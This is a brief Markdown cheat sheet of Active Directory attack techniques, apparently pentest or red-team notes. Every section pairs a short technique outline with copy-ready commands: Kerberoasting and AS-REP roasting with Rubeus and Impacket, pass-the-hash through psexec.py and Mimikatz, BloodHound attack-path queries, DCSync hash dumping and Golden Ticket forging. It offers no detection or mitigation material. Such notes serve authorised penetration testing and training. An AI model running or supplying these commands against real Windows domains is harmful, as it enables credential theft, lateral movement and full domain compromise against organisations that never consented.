# Active Directory Attacks

Advanced techniques for compromising Windows environments.

## Kerberoasting

### Process
1. Request service tickets (TGS)
2. Extract tickets from memory
3. Crack offline

### Tools
```powershell
# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# Impacket
GetUserSPNs.py domain/user:password -dc-ip 10.10.10.10 -request
```

## AS-REP Roasting

### Target
Accounts with "Do not require Kerberos preauthentication"

### Exploitation
```powershell
Rubeus.exe asreproast /outfile:asrep_hashes.txt
```

## Pass-the-Hash

### Technique
Use NTLM hash without cracking

### Tools
```bash
# Impacket
psexec.py -hashes :ntlmhash domain/user@target

# Mimikatz
sekurlsa::pth /user:admin /domain:corp /ntlm:hash /run:cmd
```

## BloodHound

### Usage
1. Collect data with SharpHound
2. Import into BloodHound
3. Analyze attack paths
4. Identify shortest path to Domain Admin

### Queries
- Shortest path to Domain Admins
- Find all Kerberoastable users
- Find computers with unconstrained delegation

## DCSync

### Attack
Replicate directory changes (dump password hashes)

### Execution
```powershell
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
```

## Golden Ticket

### Requirements
- krbtgt hash
- Domain SID

### Creation
```powershell
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /id:500
```